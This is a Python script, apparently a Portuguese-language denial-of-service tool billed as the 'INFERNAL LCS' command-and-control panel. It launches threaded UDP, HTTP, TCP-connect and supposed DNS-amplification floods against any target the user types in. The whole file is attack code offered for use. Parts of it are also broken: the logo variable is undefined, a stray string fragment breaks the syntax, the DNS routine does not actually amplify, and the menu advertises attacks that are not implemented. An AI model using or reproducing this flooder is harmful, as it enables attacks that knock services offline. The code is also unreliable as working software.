import threading
import socket
import random
import time
import os
import sys
import requests

from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Nome e Versão
program_name = f"{Fore.RED}INFERNAL LCS {Fore.YELLOW}v1.0{Style.RESET_ALL}"

        {Fore.YELLOW}>>>>> INFERNAL LCS COMMAND & CONTROL PANEL <<<<<{Style.RESET_ALL}
"""

# ======================== Variáveis Globais ========================
packets_sent = 0
connections_open = 0
attack_running = False

# ======================== Funções Principais ========================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_main_menu():
    clear_screen()
    print(infernal_logo)
    print(f"{Fore.CYAN}[L7] HTTP-FLOOD    [L7] CF-BYPASS    [L7] HTTP-AMP")
    print(f"{Fore.MAGENTA}[L4] UDP-FLOOD     [L4] TCP-DROP     [L4] DNS-AMPLIFICATION")
    print(f"{Fore.YELLOW}[*] STATUS MONITOR LIVE")
    print()
    print(f"{Fore.GREEN}Comandos disponíveis: start | monitor | exit")
    print()

def countdown_timer(seconds):
    while seconds and attack_running:
        mins, secs = divmod(seconds, 60)
        timer = f"{Fore.YELLOW}[TIMER] {mins:02d}:{secs:02d}"
        print(timer, end="\r")
        time.sleep(1)
        seconds -= 1

def udp_flood(target_ip, target_port, duration, thread_id):
    global packets_sent, connections_open
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    timeout = time.time() + duration
    while time.time() < timeout and attack_running:
        try:
            client.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            if thread_id % 10 == 0:
                print(f"{Fore.GREEN}[+] Packet sent to {target_ip}:{target_port}")
        except Exception as e:
            pass

def http_flood(target_url, duration, proxy_use, thread_id):
    global packets_sent, connections_open
    timeout = time.time() + duration
    proxies = {}
    if proxy_use:
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    while time.time() < timeout and attack_running:
        try:
            r = requests.get(target_url, proxies=proxies if proxy_use else None, timeout=5)
            packets_sent += 1
            if thread_id % 10 == 0:
                print(f"{Fore.BLUE}[+] Request sent to {target_url}")
        except:
            pass

def dns_amplification(target_ip, duration, thread_id):
    global packets_sent, connections_open
    dns_servers = ["8.8.8.8", "1.1.1.1"]
    timeout = time.time() + duration
    domain = "example.com"
    while time.time() < timeout and attack_running:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            server = random.choice(dns_servers)
            message = f"Domain {domain}".encode('utf-8')
            client.sendto(message, (server, 53))
            packets_sent += 1
            if thread_id % 10 == 0:
                print(f"{Fore.CYAN}[+] DNS Query sent to {server}")
            client.close()
        except:
            pass

def tcp_drop(target_ip, target_port, duration, thread_id):
    global packets_sent, connections_open
    timeout = time.time() + duration
    while time.time() < timeout and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.close()
            packets_sent += 1
            if thread_id % 10 == 0:
                print(f"{Fore.LIGHTMAGENTA_EX}[+] TCP Drop on {target_ip}:{target_port}")
        except:
            pass

def start_monitor(duration):
    global attack_running
    start_time = time.time()
    while attack_running and (time.time() - start_time) < duration:
        print(f"{Fore.YELLOW}[STATUS] Packets: {packets_sent} | Connections: {connections_open} | Threads Alive: {threading.active_count()-1}")
        time.sleep(2)

def start_attack():
    global attack_running, packets_sent, connections_open
    show_main_menu()
    attack_type = input(f"{Fore.GREEN}Escolha o ataque (ex: UDP, HTTP, DNS, TCP): ").strip().upper()
    target = input(f"{Fore.GREEN}Digite o IP ou URL alvo: ").strip()
    port = int(input(f"{Fore.GREEN}Porta (HTTP pode ser 80, UDP pode ser 53 etc): ").strip())
    duration = int(input(f"{Fore.GREEN}Duração do ataque (segundos): ").strip())
    threads = int(input(f"{Fore.GREEN}Número de threads: ").strip())
    proxy_choice = input(f"{Fore.GREEN}Usar Proxy? (S/N): ").strip().lower()
    proxy_use = True if proxy_choice == 's' else False
    delay_start = input(f"{Fore.GREEN}Iniciar após X segundos? (deixe vazio para imediato): ").strip()
    delay_start = int(delay_start) if delay_start else 0

    print(f"{Fore.YELLOW}[*] Preparando ataque...")
    time.sleep(delay_start)
    
    attack_running = True
    packets_sent = 0
    connections_open = 0

    threading.Thread(target=countdown_timer, args=(duration,), daemon=True).start()
    threading.Thread(target=start_monitor, args=(duration,), daemon=True).start()

    for i in range(threads):
        if attack_type == "UDP":
            threading.Thread(target=udp_flood, args=(target, port, duration, i), daemon=True).start()
        elif attack_type == "HTTP":
            threading.Thread(target=http_flood, args=(target, duration, proxy_use, i), daemon=True).start()
        elif attack_type == "DNS":
            threading.Thread(target=dns_amplification, args=(target, duration, i), daemon=True).start()
        elif attack_type == "TCP":
            threading.Thread(target=tcp_drop, args=(target, port, duration, i), daemon=True).start()
        else:
            print(f"{Fore.RED}Tipo de ataque inválido.")
            attack_running = False
            return

    time.sleep(duration)
    attack_running = False
    print(f"{Fore.GREEN}\n[✔] Ataque finalizado!")

# ======================== Main ========================
if __name__ == "__main__":
    clear_screen()
    print(infernal_logo)
    while True:
        cmd = input(f"{Fore.LIGHTGREEN_EX}root{Fore.WHITE}@{Fore.RED}InfernalLCS{Fore.WHITE}:~# {Style.RESET_ALL}").strip().lower()
        if cmd == "start":
            start_attack()
        elif cmd == "monitor":
            print(f"{Fore.CYAN}[*] Monitorando Status do Sistema...")
        elif cmd == "exit":
            print(f"{Fore.RED}Saindo...")
            sys.exit()
        else:
            print(f"{Fore.RED}[!] Comando inválido. Use: start | monitor | exit")
